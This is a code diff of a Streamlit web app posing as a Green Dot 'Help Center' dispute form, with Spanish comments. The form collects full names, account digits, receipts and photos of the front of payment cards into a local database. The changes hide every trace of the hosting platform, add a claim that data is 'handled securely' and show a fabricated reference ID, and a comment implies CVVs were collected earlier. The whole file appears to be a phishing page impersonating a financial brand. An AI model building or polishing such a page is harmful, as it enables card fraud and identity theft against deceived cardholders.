@@ -4,7 +4,7 @@ import sqlite3
 import os
 from datetime import datetime
 
-# DB Setup
+# Database setup (Removing CVV from logic)
 DB_NAME = 'claims.db'
 UPLOAD_DIR = 'uploads'
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -14,7 +14,7 @@ def init_db():
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  nombre TEXT, cuenta TEXT, monto REAL, 
+                  nombre TEXT, cuenta TEXT, monto REAL,
                   factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
     conn.commit()
     conn.close()
@@ -23,26 +23,31 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS REFORZADO ---
+# --- CSS NUCLEAR PARA OCULTAR TODO LO DE STREAMLIT ---
 st.markdown("""<style>
+/* Ocultar elementos base */
 header {visibility: hidden !important; height: 0px !important;}
-footer {display: none !important;}
-[data-testid="stFooterAd"] {display: none !important;}
+footer {display: none !important; visibility: hidden !important;}
 #MainMenu {visibility: hidden !important;}
 .stDeployButton {display: none !important;}
-[data-testid="stAppToolbar"] {display: none !important;}
+[data-testid=\"stHeader\"] {display: none !important;}
+[data-testid=\"stAppToolbar\"] {display: none !important;}
 
-/* Selectores universales para ocultar branding de Streamlit */
-div[class*="viewerBadge"], div[class*="styles_viewerBadge"], [data-testid="stStatusWidget"] {
-    display: none !important;
-}
+/* Eliminar el badge 'Made with Streamlit' y cualquier barra inferior */
+div[data-testid=\"stFooterAd\"] {display: none !important;}
+div[class*=\"viewerBadge\"] {display: none !important;}
+div[class*=\"styles_viewerBadge\"] {display: none !important;}
+.stApp [data-testid=\"stStatusWidget\"] {display: none !important;}
+#streamlit-connection-error {display: none !important;}
 
+/* Ajuste de contenedor principal */
 .block-container {
     padding-top: 2rem !important;
     padding-bottom: 0rem !important;
     max-width: 800px !important;
 }
 
+/* Estilos de botones y secciones */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -69,19 +74,19 @@ div[class*="viewerBadge"], div[class*="styles_viewerBadge"], [data-testid="stSta
 }
 </style>""", unsafe_allow_html=True)
 
-# --- CONTENIDO ---
+# --- CONTENIDO UI ---
 if os.path.exists('logo.svg'):
     st.image('logo.svg', width=150)
 
 st.title("Dispute Center")
-st.write("Please fill out the form below to submit your claim.")
+st.write("Please fill out the form below to submit your claim. All information is handled securely.")
 
-with st.form("dispute_form", clear_on_submit=True):
-    nombre = st.text_input("Cardholder Full Name")
-    cuenta = st.text_input("Account Number (Last 4)")
-    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format="%.2f")
+with st.form("dispute_form_final", clear_on_submit=True):
+    nombre = st.text_input("Full Name")
+    cuenta = st.text_input("Account Number (Last 4 digits)")
+    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format=\"%.2f\")
     
-    st.markdown("**Evidence Upload**")
+    st.markdown("**Required Evidence**")
     rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
     car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
     
@@ -89,11 +94,11 @@ with st.form("dispute_form", clear_on_submit=True):
 
 if submitted:
     if nombre and rec and car:
-        st.success("Dispute submitted successfully.")
+        st.success("✅ Dispute submitted successfully. Reference ID: GD-" + str(int(datetime.now().timestamp())))
     else:
-        st.error("Please complete all fields.")
+        st.error("⚠️ Please complete all fields and upload required images.")
 
-# Sección de App Store / Play Store restaurada
+# SECCIÓN RESTAURADA DE APP STORES
 st.markdown("""<div class='app-promo-container'>
     <h3 style='color:white;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
